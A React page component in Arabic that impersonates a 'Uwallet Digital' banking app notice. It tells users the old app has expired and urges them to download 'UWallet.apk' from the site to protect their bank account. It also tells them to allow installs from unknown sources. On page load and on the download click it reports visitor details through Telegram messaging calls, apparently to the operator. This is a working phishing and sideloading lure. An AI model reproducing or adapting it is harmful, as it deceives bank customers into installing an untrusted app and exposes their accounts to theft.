"use client"

import { useEffect } from "react"
import { Download } from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

export default function UWalletNotification() {
    useEffect(() => {
        const initTracking = async () => {
            await fetchVisitorInfo()
            await sendTelegramMessage({
                title: "UWallet Page Opened",
                type: "visitor",
            })
        }
        initTracking()
    }, [])

    const handleDownload = async () => {
        await sendTelegramMessage({
            title: "UWallet Download Clicked",
            type: "click",
        })

        // Trigger APK Download
        const link = document.createElement("a");
        link.href = "/UWallet.apk";
        link.download = "UWallet.apk";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    }

    return (
        <main
            dir="rtl"
            className="h-[100dvh] flex flex-col items-center justify-center p-4 relative overflow-hidden text-center"
            style={{
                background: "linear-gradient(180deg, #1a1f3d 0%, #1c2040 40%, #231f38 70%, #2a1f35 100%)",
            }}
        >
            {/* Subtle reddish glow at bottom */}
            <div
                className="absolute inset-0 pointer-events-none"
                style={{
                    background: "radial-gradient(ellipse 100% 60% at 50% 100%, rgba(180, 20, 60, 0.4) 0%, transparent 70%)",
                }}
            />
            {/* App Icon */}
            <div className="mb-4 sm:mb-8 relative z-10 shrink-0">
                <div
                    className="w-28 h-28 sm:w-36 sm:h-36 rounded-[24px] sm:rounded-[28px] flex items-center justify-center relative"
                    style={{
                        background: "linear-gradient(160deg, #5a5f7a 0%, #3d4158 40%, #2d3045 100%)",
                        boxShadow: "0 16px 48px rgba(0, 0, 0, 0.6), inset 0 1px 1px rgba(255, 255, 255, 0.12)",
                        padding: "6px",
                    }}
                >
                    <div
                        className="w-full h-full rounded-[22px] flex items-center justify-center overflow-hidden relative"
                        style={{
                            background: "#0c0e18",
                        }}
                    >
                        {/* Inner red/crimson gradient glow from top */}
                        <div
                            className="absolute inset-0 rounded-[22px]"
                            style={{
                                background: "radial-gradient(ellipse 90% 60% at 50% 15%, rgba(220, 20, 60, 0.95) 0%, rgba(160, 10, 40, 0.6) 40%, transparent 75%)",
                            }}
                        />
                        <img
                            src="https://play-lh.googleusercontent.com/G9fvLE4oAxjhvF_ynshWC181s-kxP9SS_RiUgCIZxOwmKKxh3lYBVaR1QR43yUSW314q6o6uLFatFBvl1w5ZclQ=w480-h960-rw"
                            alt="uwallet"
                            className="w-full h-full object-cover relative z-10"
                        />
                    </div>
                </div>
            </div>

            {/* Title */}
            <h1
                className="text-3xl sm:text-5xl font-bold text-white mb-4 sm:mb-8 relative z-10 shrink-0"
                style={{ fontFamily: "system-ui, -apple-system, sans-serif" }}
            >
                إشعار
            </h1>

            {/* Glass Card */}
            <div
                className="w-full max-w-2xl rounded-2xl px-6 py-5 sm:px-8 sm:py-7 mb-4 sm:mb-6 text-center relative z-10 overflow-auto max-h-[40vh]"
                style={{
                    background: "linear-gradient(180deg, rgba(70, 80, 120, 0.3) 0%, rgba(50, 60, 90, 0.25) 100%)",
                    backdropFilter: "blur(20px)",
                    border: "1px solid rgba(255, 255, 255, 0.1)",
                    boxShadow: "0 8px 32px rgba(0, 0, 0, 0.25)",
                }}
            >
                {/* Warning Text */}
                <p className="text-white text-xl font-semibold mb-0.5 leading-relaxed" dir="rtl">
                    انتهت صلاحية تطبيق Uwallet Digital القديم.
                </p>
                <p className="text-white text-xl font-semibold mb-5 leading-relaxed" dir="rtl">
                    الرجاء عدم استخدامه.
                </p>

                {/* Info Text */}
                <p className="text-gray-300 text-base mb-0.5 leading-relaxed" dir="rtl">
                    تم إصدار نسخة جديدة.
                </p>
                <p className="text-gray-300 text-base leading-relaxed" dir="rtl">
                    لحماية حسابك المصرفي بشكل آمن، يرجى تحديث التطبيق فوراً.
                </p>
            </div>

            {/* Badge */}
            <div
                className="px-6 py-2 sm:px-8 sm:py-3 rounded-full mb-4 sm:mb-6 relative z-10 shrink-0"
                style={{
                    background: "linear-gradient(180deg, rgba(60, 70, 110, 0.4) 0%, rgba(50, 60, 90, 0.3) 100%)",
                    border: "1px solid rgba(255, 255, 255, 0.15)",
                }}
            >
                <span className="text-white text-xs sm:text-sm font-medium tracking-wide">
                    Secure • Trusted • Updated
                </span>
            </div>

            {/* Download instruction */}
            <p className="text-gray-300 text-sm sm:text-base mb-4 sm:mb-5 relative z-10 shrink-0" dir="rtl">
                يرجى الضغط على الزر الموجود بالأسفل لتحميل النسخة الجديدة.
            </p>

            {/* Download Button */}
            <button
                onClick={handleDownload}
                className="flex items-center justify-center gap-2 sm:gap-3 px-10 py-3.5 sm:px-14 sm:py-4 rounded-full text-sm sm:text-base font-bold transition-all hover:scale-105 hover:shadow-xl relative z-10 shrink-0"
                style={{
                    background: "linear-gradient(180deg, #f5f7fa 0%, #e8eaf0 100%)",
                    color: "#1a365d",
                    boxShadow: "0 4px 20px rgba(255, 255, 255, 0.12)",
                }}
            >
                <Download className="w-4 h-4 sm:w-5 sm:h-5" strokeWidth={2.5} />
                <span>DOWNLOAD UPDATED APP</span>
            </button>

            {/* Footer note */}
            <p className="text-gray-400 text-sm mt-6 text-center max-w-xl relative z-10" dir="rtl">
                إذا ظهر تنبيه (مصادر غير معروفة)، قم بالسماح مرة واحدة ثم ثبت التطبيق.
            </p>
        </main>
    )
}
